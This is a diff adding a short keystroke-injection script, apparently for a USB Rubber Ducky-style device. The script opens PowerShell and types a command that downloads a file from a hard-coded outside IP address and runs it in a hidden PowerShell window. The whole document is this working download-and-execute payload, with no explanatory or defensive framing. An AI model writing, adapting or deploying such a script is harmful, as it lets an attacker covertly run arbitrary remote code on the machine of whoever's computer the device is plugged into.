@@ -1,0 +1,11 @@
+DELAY 5000
+CONTROL ESCAPE
+DELAY 300
+STRING Powershell
+DELAY 300
+ENTER
+DELAY 900
+STRING $webClient = New-Object System.Net.WebClient
+ENTER
+STRING $webClient.DownloadString('http://192.81.216.6/blob.txt') | powershell.exe -windowstyle hidden -noprofile -
+ENTER
